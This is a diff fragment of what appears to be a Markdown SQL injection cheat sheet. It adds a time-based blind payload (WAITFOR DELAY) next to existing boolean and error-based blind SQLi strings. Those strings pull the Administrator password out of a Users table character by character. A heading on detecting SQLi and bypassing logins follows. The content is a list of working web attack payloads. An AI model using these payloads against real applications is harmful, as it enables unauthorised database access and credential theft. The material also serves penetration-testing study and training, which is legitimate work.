@@ -29,6 +29,8 @@ xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator')
 xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
 xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+
 ```
 ### Determinig SQLi Vulnerablity & Login Bypass
 ```sql
